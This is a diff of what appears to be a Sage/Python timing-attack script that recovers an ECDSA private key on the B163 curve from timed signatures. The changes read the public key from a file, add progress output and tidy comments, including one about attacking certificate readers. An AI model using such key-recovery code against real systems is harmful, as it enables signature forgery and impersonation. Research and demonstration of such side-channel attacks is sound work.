@@ -155,10 +155,17 @@ def publickey_from_octetstring(curve, string):
 curve, generator, fixed_order = B163()
 F = GF(fixed_order)
 
-# There's 3 ways to enter the public key: as octet string (if you'd want to use this for attacking something that reads a certificate), as binary string, and as integers:
-#publickey = publickey_from_octetstring(curve, "04:01:cd:58:31:7a:37:40:6b:c8:0d:ef:e4:78:60:03:41:0f:7d:bd:cb:71:07:0c:10:8e:ea:cd:c2:7f:d6:fc:a9:eb:8d:98:83:ac:f9:24:7d:2b:c1")
-#publickey = get_publickey(curve, 0b101010100011100001010100010001011010111110110100011001010101100100000001010100001100110101110000110010001101010101111100100000001011010100001101100001100001110000, 0b1011111111011011001111001111010000000001110000101000100110000000011110000110011001000111010010111100011010110000101110110000110010011001101010100001111010000101000)
-publickey = get_publickey(curve, 9539482754708420824381805283406692714806201637555,8320640249452422274484421933510243419455281123645)
+# There's 3 nice ways to enter the public key: as octet string (if you'd want to use this for attacking something that reads a certificate), as binary string, and as integers:
+
+# publickey = publickey_from_octetstring(curve, "04:01:cd:...")
+# publickey = get_publickey(curve, 0b101010100... (x coordinate), 0b10111111... (y coordinate))
+# publickey = get_publickey(curve, 95394827547... (x coordinate), 8320640249... (y coordinate))
+
+# But we're just going to read it (decimally) from a file:
+with open("publickey", "r") as publickey_file:
+  content = publickey_file.read()
+  x, y = content.split(",")
+  publickey = get_publickey(curve, int(x), int(y))
 
 @parallel
 def try_it(subset):
@@ -166,19 +173,22 @@ def try_it(subset):
   print "Computed the private key as: %s" % str(private)
   correct = is_private_key_correct(generator, publickey, private)
   if correct:
-    print "FOUND IT! private key is %s!" % str(private)
+    print "... FOUND IT! private key is %s!" % str(private)
+    print "... you can Ctrl+C now to stop the computation"
+  else:
+    print "... but it was not the correct private key, continuing to search"
 
 def find_private():
-  # We have the option to also get the nonce k and ceiling(lg(k)) as extra fields
+  # The input format is message (digest), r, s, time
   inputs = []
-  for (m, sig_r,sig_s,time) in data: # ,log_k)
-  #for (time,sig_r,sig_s) in data: # ,log_k)
-    #m = int(m) >> (512 - 163) # TODO make configurable, hack to truncate the right amount of bits (this code is for when I tried to attack against a Java implementation)
+  for (m, sig_r,sig_s,time) in data:
+    # If you'd ever need to manually truncate the digest to the right number of bits: m = int(m) >> (512 - 163)
     inputs.append(Input(F, F(int(m)), F(int(sig_r)), F(int(sig_s)), int(time)))
 
   # Sort by time
   inputs = sorted(inputs, key=lambda k: k.time)
   #print inputs
+
   print "Computing..."
 
   while True:
@@ -188,6 +198,3 @@ def find_private():
       subsets.append(subset)
     for i in try_it(subsets):
       i
-  
-
-  
